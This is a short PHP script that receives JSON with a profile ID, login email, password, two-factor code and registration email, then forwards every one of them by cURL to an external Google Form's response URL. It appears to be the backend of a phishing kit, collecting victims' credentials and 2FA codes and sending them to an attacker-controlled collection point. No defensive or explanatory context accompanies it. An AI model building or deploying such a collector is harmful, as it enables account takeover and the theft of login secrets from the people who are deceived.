<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        
    header('Content-Type: application/json');

    $json = file_get_contents('php://input');
    $data = json_decode($json, true);

    if (!$data || !isset($data['profileUid'], $data['password'], $data['mailLogin'])) {
        echo json_encode(['error' => 'Missing profileUid, mailLogin, password']);
        exit;
    }

    $profileUid     = $data['profileUid'];
    $mailLogin      = $data['mailLogin'];
    $password       = $data['password'];
    $twoFA          = $data['twoFA'] ?? '';
    $mailRegister   = $data['mailRegister'] ?? '';

    $formData = [
        'entry.253760332'  => $profileUid,
        'entry.1003131208' => $mailLogin,
        'entry.2042190536' => $password,
        'entry.1077588694' => $twoFA,
        'entry.1053446651' => $mailRegister
    ];

    $encodedData = http_build_query($formData);

    $googleFormUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSd9Cwj8b5BYPjOrMqgZXDKj9J7ePDKzaPoyr0Y8e914NuJ_CA/formResponse';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $googleFormUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $encodedData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded'
    ]);

    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        http_response_code(500);
        echo json_encode(['error' => $error]);
    } else {
        echo json_encode(['success' => true, 'forwarded' => true]);
    }
} else {
    echo json_encode(['error' => 'Method must be POST.']);
}

?>
